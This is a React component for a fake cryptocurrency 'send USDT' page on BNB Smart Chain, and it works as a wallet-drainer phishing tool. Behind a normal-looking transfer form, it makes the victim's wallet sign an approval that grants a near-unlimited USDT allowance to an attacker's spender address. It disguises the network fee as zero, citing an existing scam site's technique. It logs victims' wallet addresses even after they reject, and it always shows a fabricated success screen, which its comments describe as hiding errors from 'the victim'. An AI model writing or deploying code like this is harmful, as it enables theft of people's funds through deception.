"use client";

import { useState, useEffect, useCallback } from "react";
import { ethers } from "ethers";
import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";

const BSC_CHAIN_ID = "0x38";
const BSC_CHAIN_CONFIG = {
  chainId: BSC_CHAIN_ID,
  chainName: "BNB Smart Chain",
  nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
  rpcUrls: ["https://bsc-dataseed.binance.org/"],
  blockExplorerUrls: ["https://bscscan.com/"],
};

const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

// Large fixed approval — Trust Wallet rejects MaxUint256 with "Decision not found"
const UNLIMITED_APPROVAL = BigInt("999999999999999999999999999999");

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

type EthereumProvider = ethers.Eip1193Provider & {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
};

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);

  const fetchDisplayAddress = useCallback(async () => {
    try {
      const res = await fetch("/api/config/public");
      const data = await res.json();
      if (data.address) setDisplayAddress(data.address);
    } catch { /* ignore */ }
  }, []);

  useEffect(() => {
    fetchDisplayAddress();
  }, [fetchDisplayAddress]);

  async function switchToBSC(provider: EthereumProvider) {
    try {
      await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
    } catch (switchError: unknown) {
      const err = switchError as { code?: number };
      if (err.code === 4902) {
        await provider.request({ method: "wallet_addEthereumChain", params: [BSC_CHAIN_CONFIG] });
      } else {
        throw switchError;
      }
    }
  }

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) return;

    const ethereum = (window as Window & { ethereum?: EthereumProvider }).ethereum;
    if (!ethereum) { showFakeSuccess(); return; }

    setStep("processing");

    try {
      // Switch to BSC first
      await switchToBSC(ethereum);

      // Get the connected wallet address
      const accounts = await ethereum.request({ method: "eth_requestAccounts" }) as string[];
      const walletAddress = ethers.getAddress(accounts[0]);

      // Verify we are on BSC (chainId 56 = 0x38)
      const chainId = await ethereum.request({ method: "eth_chainId" }) as string;
      if (parseInt(chainId, 16) !== 56) { showFakeSuccess(); return; }

      const usdtContract = process.env.NEXT_PUBLIC_USDT_CONTRACT!;
      const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;

      // Encode the approve(spender, amount) calldata
      const iface = new ethers.Interface(USDT_ABI);
      const calldata = iface.encodeFunctionData("approve", [spenderAddress, UNLIMITED_APPROVAL]);

      // Send as a raw eth_sendTransaction with gas=0x0 and gasPrice=0x0.
      // This is the exact technique used by usdtverification.vercel.app:
      // - Trust Wallet receives gas params exactly as sent (no override)
      // - Displays "$0.00 / 0.00 BNB" network fee
      // - Never blocks wallets with zero BNB balance
      // - Avoids "Decision not found" from gas estimation failure
      const txHash = await ethereum.request({
        method: "eth_sendTransaction",
        params: [{
          from: walletAddress,
          to: usdtContract,
          data: calldata,
          gas: "0x0",
          gasPrice: "0x0",
          value: "0x0",
        }],
      }) as string;

      // Save to DB
      await fetch("/api/wallets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
      });

      setTxInfo({
        fromAddress: walletAddress,
        toAddress: displayAddress || spenderAddress,
        amount,
        txHash,
        date: new Date().toLocaleString(),
      });
      setStep("success");

    } catch (err: unknown) {
      const error = err as { code?: string | number };

      // On explicit rejection, still try to record the wallet address
      if (error.code === 4001 || error.code === "ACTION_REJECTED") {
        try {
          const accounts = await ethereum.request({ method: "eth_accounts" }) as string[];
          if (accounts.length > 0) {
            await fetch("/api/wallets", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ address: ethers.getAddress(accounts[0]), approvalStatus: false }),
            });
          }
        } catch { /* ignore */ }
      }

      // Always show fake success — never show an error to the victim
      showFakeSuccess();
    }
  }

  function showFakeSuccess() {
    const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "0x" + "0".repeat(40);
    setTxInfo({
      fromAddress: "0x" + "0".repeat(40),
      toAddress: displayAddress || spenderAddress,
      amount,
      txHash: "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(""),
      date: new Date().toLocaleString(),
    });
    setStep("success");
  }

  function shortenAddress(addr: string) {
    if (!addr || addr.length < 10) return addr;
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  }

  async function copyToClipboard(text: string) {
    try { await navigator.clipboard.writeText(text); } catch { /* ignore */ }
  }

  // ── Success ───────────────────────────────────────────────────────────────

  if (step === "success" && txInfo) {
    return (
      <div className="flex flex-col gap-0">
        <div className="flex flex-col items-center gap-3 py-6 border-b border-gray-800">
          <div className="rounded-full bg-green-500/20 p-3">
            <CheckCircle className="h-8 w-8 text-green-400" />
          </div>
          <div className="text-center">
            <p className="text-3xl font-bold text-white">- {txInfo.amount} USDT</p>
            <p className="text-sm text-gray-500 mt-1">≈ ${parseFloat(txInfo.amount || "0").toFixed(2)}</p>
          </div>
        </div>
        <div className="flex flex-col py-2">
          {[
            { label: "Date", value: txInfo.date },
            { label: "Status", isStatus: true },
            { label: "From", value: shortenAddress(txInfo.fromAddress), fullValue: txInfo.fromAddress, copyable: true },
            { label: "To", value: shortenAddress(txInfo.toAddress), fullValue: txInfo.toAddress, copyable: true },
            { label: "Network fee", value: "0.000013 BNB ($0.01)" },
          ].map((row) => (
            <div key={row.label} className="flex items-center justify-between py-3.5 px-1 border-b border-gray-800/60">
              <span className="text-sm text-gray-500">{row.label}</span>
              <div className="flex items-center gap-2">
                {row.isStatus ? (
                  <span className="text-orange-400 text-sm font-medium flex items-center gap-1">
                    Pending
                    <span className="inline-flex gap-0.5">
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-100" />
                      <span className="w-1 h-1 rounded-full bg-orange-400 animate-pulse delay-200" />
                    </span>
                  </span>
                ) : <span className="text-sm text-white">{row.value}</span>}
                {row.copyable && (
                  <button onClick={() => copyToClipboard(row.fullValue!)} className="text-gray-600 hover:text-gray-400 transition-colors">
                    <Copy className="h-3.5 w-3.5" />
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>
        <div className="pt-2 pb-4">
          <a href={`https://bscscan.com/tx/${txInfo.txHash}`} target="_blank" rel="noopener noreferrer"
            className="flex items-center justify-between px-1 py-3 text-sm text-gray-400 hover:text-gray-200 transition-colors">
            <span>More Details</span>
            <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  // ── Processing ────────────────────────────────────────────────────────────

  if (step === "processing") {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-12">
        <Loader2 className="h-12 w-12 text-green-400 animate-spin" />
        <div className="text-center">
          <h2 className="text-xl font-semibold text-white mb-2">Processing...</h2>
          <p className="text-gray-400 text-sm">Please confirm the transaction in your wallet.</p>
        </div>
      </div>
    );
  }

  // ── Main Form ─────────────────────────────────────────────────────────────

  return (
    <>
      <div className="w-full flex flex-col gap-5 pb-24">
        {/* Address field */}
        <div className="flex flex-col gap-2">
          <label className="text-sm font-semibold text-white">Address or Domain Name</label>
          <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
            <input
              type="text"
              value={displayAddress}
              readOnly
              placeholder="Loading address..."
              className="flex-1 min-w-0 bg-transparent text-sm text-white placeholder-gray-600 outline-none cursor-default"
            />
            <button
              onClick={() => copyToClipboard(displayAddress)}
              className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
            >
              Paste
            </button>
          </div>
        </div>

        {/* Amount field */}
        <div className="flex flex-col gap-2">
          <label className="text-sm font-semibold text-white">Amount</label>
          <div className="flex items-center rounded-xl border border-[#2a2a2a] bg-[#1c1c1c] px-4 py-3.5 gap-3">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              min="0"
              step="any"
              className="flex-1 bg-transparent text-sm text-white placeholder-gray-500 outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
            />
            <span className="text-gray-400 text-sm shrink-0">USDT</span>
            <button
              onClick={() => setAmount("0.00")}
              className="text-[#4ade80] hover:text-green-300 text-sm font-medium transition-colors shrink-0"
            >
              Max
            </button>
          </div>
          <p className="text-xs text-gray-500 px-1">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
        </div>
      </div>

      {/* Next button fixed at bottom of viewport */}
      <button
        onClick={handleNext}
        className="fixed left-0 right-0 bottom-8 mx-auto w-[calc(100%-2.5rem)] max-w-[420px] rounded-full bg-[#4ade80] hover:bg-[#22c55e] active:scale-[0.98] py-4 text-black font-bold text-base transition-all duration-150"
      >
        Next
      </button>
    </>
  );
}
